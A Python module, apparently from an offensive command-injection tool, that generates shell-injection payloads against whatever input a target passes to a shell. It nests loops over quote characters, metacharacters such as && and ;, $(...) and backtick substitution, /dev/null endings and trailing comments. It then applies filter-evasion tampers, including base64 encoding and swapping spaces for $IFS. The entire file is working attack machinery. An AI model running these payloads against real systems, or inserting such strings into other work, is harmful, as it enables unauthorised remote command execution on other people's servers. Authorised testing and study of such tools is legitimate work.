from typing import Generator, Callable

from raycharles.tampers import *


PayloadGenerator      = Callable[[str], str]

ENDINGS               = (">/dev/null", "2>/dev/null")
META_CHARS            = ("&&", "||", "&", "|", ";")
QUOTE_CHARS           = ("'", '"')
COMMENT_CHARS         = ("#",)
SUBSTITUTION_PATTERNS = ("$(%(cmd)s)", "`%(cmd)s`")

DEFAULT_TAMPERS: list[PayloadGenerator]       = [default_tamper, add_dollar_and_ats, replace_spaces_with_ifs]
DEFAULT_PRE_TAMPERS: list[PayloadGenerator]   = [default_tamper, encapsulate_into_curly_braces, encode_base64]


def build_payload_generators(
    tampers=DEFAULT_TAMPERS,
    pre_tampers=DEFAULT_PRE_TAMPERS,
) -> Generator[PayloadGenerator | str, None, None]:
    """ Build payload generators """

    for pre_tamper in pre_tampers:
        for tamper in tampers:
            yield lambda cmd: tamper(pre_tamper(cmd))

            yield f"Using quote + substitution patterns payloads (tamper={tamper.__name__}, pretamper={pre_tamper.__name__})"
            for qc in QUOTE_CHARS:
                for sp in SUBSTITUTION_PATTERNS:
                    yield lambda cmd: tamper(qc + sp % {"cmd": pre_tamper(cmd)})

                    for cc in COMMENT_CHARS:
                        yield lambda cmd: tamper(
                            qc + sp % {"cmd": pre_tamper(cmd)} + cc
                        )

                    yield lambda cmd: tamper(sp % {"cmd": pre_tamper(cmd)} + qc)

                    for cc in COMMENT_CHARS:
                        yield lambda cmd: tamper(
                            sp % {"cmd": pre_tamper(cmd)} + qc + cc
                        )

                    yield lambda cmd: tamper(qc + sp % {"cmd": pre_tamper(cmd)} + qc)

                    for cc in COMMENT_CHARS:
                        yield lambda cmd: tamper(
                            qc + sp % {"cmd": pre_tamper(cmd)} + qc + cc
                        )

            yield f"Using quote + meta characters payloads (tamper={tamper.__name__}, pretamper={pre_tamper.__name__})"
            for qc in QUOTE_CHARS:
                for mc in META_CHARS:
                    yield lambda cmd: tamper(qc + mc + pre_tamper(cmd))


            yield f"Using quote + meta characters + comment payloads (tamper={tamper.__name__}, pretamper={pre_tamper.__name__})"
            for qc in QUOTE_CHARS:
                for mc in META_CHARS:
                    for cc in COMMENT_CHARS:
                        yield lambda cmd: tamper(qc + mc + pre_tamper(cmd) + cc)

            yield f"Using quote + ending + meta characters payloads (tamper={tamper.__name__}, pretamper={pre_tamper.__name__})"
            for qc in QUOTE_CHARS:
                for mc in META_CHARS:
                    for end in ENDINGS:
                        yield lambda cmd: tamper(qc + end + mc + pre_tamper(cmd))


            yield f"Using quote + ending + meta characters + comment payloads (tamper={tamper.__name__}, pretamper={pre_tamper.__name__})"
            for qc in QUOTE_CHARS:
                for mc in META_CHARS:
                    for end in ENDINGS:
                        for cc in COMMENT_CHARS:
                            yield lambda cmd: tamper(
                                qc + end + mc + pre_tamper(cmd) + cc
                            )

            yield f"Using substitution patterns payloads (tamper={tamper.__name__}, pretamper={pre_tamper.__name__})"
            for sp in SUBSTITUTION_PATTERNS:
                yield lambda cmd: tamper(sp % {"cmd": pre_tamper(cmd)})

            yield f"Using meta characters payloads (tamper={tamper.__name__}, pretamper={pre_tamper.__name__})"
            for mc in META_CHARS:
                yield lambda cmd: tamper(mc + pre_tamper(cmd))

            yield f"Using meta characters + comment payloads (tamper={tamper.__name__}, pretamper={pre_tamper.__name__})"
            for mc in META_CHARS:
                for cc in COMMENT_CHARS:
                    yield lambda cmd: tamper(mc + pre_tamper(cmd) + cc)

            yield f"Using ending + meta characters payloads (tamper={tamper.__name__}, pretamper={pre_tamper.__name__})"
            for mc in META_CHARS:
                for end in ENDINGS:
                    yield lambda cmd: tamper(end + mc + pre_tamper(cmd))
        
            yield f"Using ending + meta characters + comment payloads (tamper={tamper.__name__}, pretamper={pre_tamper.__name__})"
            for mc in META_CHARS:
                for end in ENDINGS:
                    for cc in COMMENT_CHARS:
                        yield lambda cmd: tamper(end + mc + pre_tamper(cmd) + cc)
